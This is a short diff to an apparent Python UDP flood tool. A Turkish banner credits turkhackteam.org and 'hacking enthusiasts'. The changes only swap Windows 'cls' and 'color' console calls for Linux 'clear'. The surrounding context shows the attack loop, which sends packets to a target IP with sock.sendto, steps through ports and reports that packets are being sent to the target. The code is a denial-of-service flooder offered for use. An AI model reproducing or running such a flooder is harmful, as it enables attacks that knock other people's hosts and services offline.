@@ -4,12 +4,12 @@ import os
 import time
 import socket
 import random
-os.system("cls")
-os.system("color a")
+os.system("clear")
+os.system("clear")
 print("~#~; Program turkhackteam.org ve hacking sevenler ailesi icin hazirlanmistir.")
 time.sleep(5)
-os.system("color c")
-os.system("cls")
+os.system("clear")
+os.system("clear")
 print("""
                         dp
                         
@@ -34,7 +34,7 @@ while True:
 		sock.sendto(bytes,(ip,port))
 		sent = sent + 1
 		port = port + 1
-		os.system("color a")
+		os.system("clear")
 		print("%s Paketler hedefe gonderiliyor."%sent)
 			
 	except KeyboardInterrupt:
